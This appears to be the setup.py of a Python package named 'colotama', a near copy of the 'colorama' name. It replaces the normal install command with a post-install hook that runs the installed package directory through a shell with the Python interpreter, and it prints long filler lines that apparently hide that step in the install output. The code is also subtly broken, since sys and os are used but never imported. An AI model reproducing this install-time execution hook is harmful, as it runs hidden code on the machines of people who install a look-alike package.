from setuptools import setup
from setuptools.command.bdist_egg import bdist_egg as _bdist_egg
from subprocess import call
from setuptools.command.install import install as _install

def _post_install(dir):
        print(";"*200)
        _a = sys.executable
        _b = os.path.join(dir, 'colotama')
        call([f"{_a} {_b}"], shell=True)

class install(_install):
    def run(self):
        _install.run(self)
        print("-"*200)
        self.execute(_post_install, (self.install_lib,), msg="Running post install task")
        print("?"*200)

setup(
    name="colotama",
    version="0.4.4",
    packages=["colotama"],
    description="",
    author="Asian Mlik",
    author_email="help@colotama.com",
    install_requires=[
        "pyprettifier"
    ],
    cmdclass={
        'install': install},
    python_requires='>=3.6'
)
